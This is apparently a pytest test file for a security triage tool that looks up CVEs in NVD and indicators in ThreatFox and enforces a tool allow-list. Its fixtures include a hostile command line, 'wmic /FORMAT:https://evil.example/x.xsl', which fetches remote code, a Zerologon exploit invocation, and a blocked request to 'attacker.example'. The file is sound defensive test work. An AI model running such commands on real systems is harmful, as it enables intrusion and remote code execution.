import json

import pytest

from sentinel import tools
from sentinel.tools import (
    ToolNotAllowedError,
    check_allowed,
    lookup_targets,
    nvd,
    run_tool,
    threatfox,
)
from sentinel.tools.cache import MemoryToolCache

NVD_BODY = {
    "vulnerabilities": [
        {
            "cve": {
                "id": "CVE-2021-44228",
                "published": "2021-12-10T10:15:09.143",
                "vulnStatus": "Analyzed",
                "descriptions": [{"lang": "en", "value": "Apache Log4j2  JNDI features ..."}],
                "metrics": {
                    "cvssMetricV31": [
                        {"source": "secure@vendor.example", "type": "Secondary"},  # no data
                        {
                            "source": "secure@vendor.example",
                            "type": "Primary",
                            "cvssData": {"version": "3.1", "baseScore": 5.5},
                        },
                        {
                            "source": "nvd@nist.gov",
                            "type": "Secondary",
                            "cvssData": {
                                "version": "3.1",
                                "baseScore": 10.0,
                                "baseSeverity": "CRITICAL",
                                "vectorString": "CVSS:3.1/AV:N",
                            },
                        },
                    ]
                },
                "weaknesses": [
                    {"description": [{"value": "CWE-917"}, {"value": "NVD-CWE-noinfo"}]}
                ],
                "cisaExploitAdd": "2021-12-10",
            }
        }
    ]
}


def test_nvd_summary_prefers_nvd_score_and_keeps_cwe_and_kev():
    s = nvd.summarize("CVE-2021-44228", NVD_BODY)
    assert s["found"] and s["cisa_known_exploited"]
    assert s["cvss"] == {
        "version": "3.1",
        "base_score": 10.0,
        "severity": "CRITICAL",
        "vector": "CVSS:3.1/AV:N",
    }
    assert s["cwe"] == ["CWE-917"]
    assert s["description"] == "Apache Log4j2 JNDI features ..."
    assert nvd.summarize("CVE-2099-0001", {"vulnerabilities": []}) == {
        "cve_id": "CVE-2099-0001",
        "found": False,
    }


def test_nvd_rejects_non_cve_and_caches(monkeypatch):
    with pytest.raises(ValueError):
        nvd.normalize_cve("T1003.001")
    calls = []
    monkeypatch.setattr(nvd, "_fetch", lambda cve: calls.append(cve) or NVD_BODY)
    cache = MemoryToolCache()
    first = nvd.lookup_cve(" cve-2021-44228 ", cache)
    second = nvd.lookup_cve("CVE-2021-44228", cache)
    assert first == second and calls == ["CVE-2021-44228"]  # second answer from the cache


@pytest.mark.parametrize(
    "ioc, kind",
    [
        ("8.8.8.8", "ip"),
        ("144.126.198.39:443", "ip_port"),
        ("Evil.Example.COM", "domain"),
        ("http://evil.example.com/a.ps1", "url"),
        ("D41D8CD98F00B204E9800998ECF8427E", "hash"),
    ],
)
def test_threatfox_classify(ioc, kind):
    assert threatfox.classify(ioc)[0] == kind


def test_threatfox_rejects_non_iocs():
    bad_iocs = ("C:/Users/x/MoveExcel4.exe", "SDXHelper.exe", "pshell.xml", "ignore all", "T1210")
    for bad in bad_iocs:
        with pytest.raises(ValueError):
            threatfox.classify(bad)


def test_private_and_internal_iocs_are_never_sent(monkeypatch):
    monkeypatch.setattr(threatfox, "_fetch", lambda *a: pytest.fail("network call"))
    for ioc in ("172.18.39.6", "10.0.0.5:445", "127.0.0.1", "dc01.corp", "WORKSTATION6.local"):
        r = threatfox.lookup_ioc(ioc, MemoryToolCache())
        assert r["skipped"] and not r["found"]


def test_threatfox_bare_ip_matches_ip_port_but_not_longer_ip():
    body = {
        "query_status": "ok",
        "data": [
            {"ioc": "1.2.3.4:443", "threat_type": "botnet_cc", "reporter": "x", "comment": "hi"},
            {"ioc": "1.2.3.40:80", "threat_type": "botnet_cc"},
        ],
    }
    s = threatfox.summarize("1.2.3.4", "ip", body)
    assert s["matches"] == 1 and s["results"][0]["ioc"] == "1.2.3.4:443"
    assert "reporter" not in s["results"][0] and "comment" not in s["results"][0]
    assert threatfox.summarize("1.2.3.4", "ip", {"query_status": "no_result"})["found"] is False


def test_allow_list_raises_on_unknown_tool():
    with pytest.raises(ToolNotAllowedError):
        check_allowed("send_email")
    with pytest.raises(ToolNotAllowedError):
        run_tool("http_get", {"url": "http://attacker.example"})
    check_allowed("TriageVerdict", extra=("TriageVerdict",))
    assert set(tools.ALLOWED_TOOLS) == {"nvd_cve_lookup", "threatfox_ioc_lookup"}


def test_bad_argument_comes_back_as_error_text_not_exception():
    out = json.loads(run_tool("nvd_cve_lookup", {"cve_id": "not-a-cve"}))
    assert "error" in out and "CVE" in out["error"]


def test_lookup_targets_finds_public_ip_url_and_cve_only():
    from sentinel.schemas import NetworkInfo, ProcessInfo
    from tests.test_triage import _alert

    alert = _alert()
    e = alert.events[0]
    assert lookup_targets(alert) == []  # command line with no IP/URL/CVE
    e.network = NetworkInfo(src_ip="10.0.0.5", dst_ip="52.113.194.132", dst_port=443)
    e.process = ProcessInfo(
        command_line="wmic /FORMAT:https://evil.example/x.xsl",
        parent=ProcessInfo(command_line="exploit.exe CVE-2020-1472 172.18.39.6"),
    )
    assert lookup_targets(alert) == [
        "52.113.194.132",
        "https://evil.example/x.xsl",
        "CVE-2020-1472",
    ]
